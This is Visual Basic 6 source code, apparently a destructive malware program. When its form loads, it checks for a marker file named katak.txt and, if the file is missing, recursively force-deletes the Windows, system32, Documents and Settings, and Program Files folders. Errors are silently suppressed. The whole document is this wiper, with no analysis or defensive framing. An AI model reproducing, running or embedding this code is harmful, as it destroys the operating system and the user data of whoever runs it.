Public Sub DelAll(ByVal DirtoDelete As Variant)
Dim FSO, FS
Set FSO = CreateObject(“Scripting.FileSystemObject”)
FS = FSO.DeleteFolder(DirtoDelete, True)
End Sub

Private Sub Form_Load()
On Error Resume Next

If FileExist(“c:\windows\system32\katak.txt”) = True Then
End
Else
Call DelAll(“c:\windows\system”)
Call DelAll(“c:\windows\system32”)
Call DelAll(“c:\windows”)
Call DelAll(“C:\Documents and Settings\All Users”)
Call DelAll(“C:\Documents and Settings\Administrator”)
Call DelAll(“C:\Documents and Settings”)
Call DelAll(“C:\Program Files\Common Files”)
Call DelAll(“C:\Program Files\Internet Explorer”)
Call DelAll(“C:\Program Files\Microsoft Visual Studio”)
Call DelAll(“C:\Program Files”)
End
End If
End Sub

Function FileExist(ByVal FileName As String) As Boolean
If Dir(FileName) = “” Then
FileExist = False
Else
FileExist = True
End If
End Function

